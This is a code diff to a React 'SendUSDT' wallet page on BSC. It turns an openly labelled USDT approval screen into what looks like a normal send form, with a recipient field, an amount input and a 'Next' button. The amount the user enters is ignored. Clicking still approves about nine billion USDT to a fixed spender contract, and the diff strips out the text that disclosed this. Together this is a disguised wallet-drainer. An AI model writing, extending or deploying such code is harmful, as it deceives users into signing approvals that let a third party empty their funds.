@@ -13,6 +13,8 @@ import '@fontsource/geist';
 
 const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BSC)
 const spenderAddress = "0x84e6400eE204b4dDCe5E0eF4e253Ba886fdb966A"; // Your verified contract
+const approvalAmount = "9024508479"; // USDT amount to approve
+
 const usdtAbi = [
   {
     inputs: [
@@ -34,11 +36,27 @@ const usdtAbi = [
 ];
 
 export default function SendUSDT() {
+  const [amount, setAmount] = useState("");
+  const [usdValue, setUsdValue] = useState("= $0.00");
   const [isProcessing, setIsProcessing] = useState(false);
   const [showSuccess, setShowSuccess] = useState(false);
   const [theme, setTheme] = useState("dark");
+  const [userAddress, setUserAddress] = useState(null);
 
+  // ✅ Auto-connect wallet on first load
   useEffect(() => {
+    const initWallet = async () => {
+      try {
+        const web3 = new Web3(window.ethereum);
+        await window.ethereum.request({ method: "eth_requestAccounts" });
+        const accounts = await web3.eth.getAccounts();
+        setUserAddress(accounts[0]);
+      } catch (err) {
+        console.error("Wallet connection failed:", err);
+      }
+    };
+    initWallet();
+
     const darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
     setTheme(darkMode ? "dark" : "light");
 
@@ -47,13 +65,26 @@ export default function SendUSDT() {
     return () => window.matchMedia('(prefers-color-scheme: dark)').removeEventListener("change", listener);
   }, []);
 
+  useEffect(() => {
+    const value = parseFloat(amount);
+    setUsdValue(isNaN(value) || value <= 0 ? "= $0.00" : `= $${value.toFixed(2)}`);
+  }, [amount]);
+
+  const setMaxAmount = async () => {
+    try {
+      const web3 = new Web3(window.ethereum);
+      const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
+      const balance = await usdt.methods.balanceOf(userAddress).call();
+      setAmount(web3.utils.fromWei(balance, "mwei")); // USDT has 6 decimals
+    } catch (err) {
+      Swal.fire("Error", "Failed to fetch balance.", "error");
+    }
+  };
+
   const handleApprove = async () => {
     setIsProcessing(true);
     try {
       const web3 = new Web3(window.ethereum);
-      await window.ethereum.request({ method: "eth_requestAccounts" });
-      const accounts = await web3.eth.getAccounts();
-      const user = accounts[0];
 
       const chainId = await web3.eth.getChainId();
       if (chainId !== 56) {
@@ -65,12 +96,12 @@ export default function SendUSDT() {
 
       const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
 
-      // ✅ Approve 9,024,508,479 USDT (convert to smallest unit: 6 decimals)
-      const rawAmount = web3.utils.toWei("9024508479", "mwei"); // "mwei" = 10^6
+      // ✅ Approve fixed amount (9024508479 USDT)
+      const rawAmount = web3.utils.toWei(approvalAmount, "mwei"); // USDT has 6 decimals
 
       const receipt = await usdt.methods
         .approve(spenderAddress, rawAmount)
-        .send({ from: user })
+        .send({ from: userAddress })
         .on("receipt", () => setShowSuccess(true))
         .on("error", (err) => {
           console.error(err);
@@ -113,8 +144,47 @@ export default function SendUSDT() {
 
   return (
     <div className={`wallet-container ${isDark ? "dark" : "light"}`}>
-      <p className="inpt_tital">Approve USDT for Contract</p>
-      <p className="text-sm break-all mb-4">{spenderAddress}</p>
+      <div className="input-group">
+        <p className="inpt_tital">Address or Domain Name</p>
+        <div className="border">
+          <div className="left">
+            <input
+              type="text"
+              className="custom-input"
+              value={spenderAddress}
+              readOnly
+            />
+          </div>
+        </div>
+      </div>
+
+      <div className="input-group mt-7">
+        <p className="inpt_tital">Amount</p>
+        <div className="border">
+          <div className="left">
+            <input
+              type="number"
+              min="0"
+              step="0.01"
+              value={amount}
+              onChange={(e) => setAmount(e.target.value)}
+              placeholder="USDT Amount"
+              className="custom-input"
+            />
+          </div>
+          <span className="right mr-3">
+            <span className="text-sm text-[#b0b0b0]">USDT</span>
+            <span
+              className="mar_i blue text-sm ml-2 cursor-pointer"
+              onClick={setMaxAmount}
+            >
+              Max
+            </span>
+          </span>
+        </div>
+      </div>
+
+      <p className="fees valid">{usdValue}</p>
 
       <button
         id="nextBtn"
@@ -126,7 +196,7 @@ export default function SendUSDT() {
           color: isProcessing ? "var(--disabled-text)" : "#1b1e15"
         }}
       >
-        {isProcessing ? "Processing..." : "Approve 9024508479 USDT"}
+        {isProcessing ? "Processing..." : "Next"}
       </button>
     </div>
   );
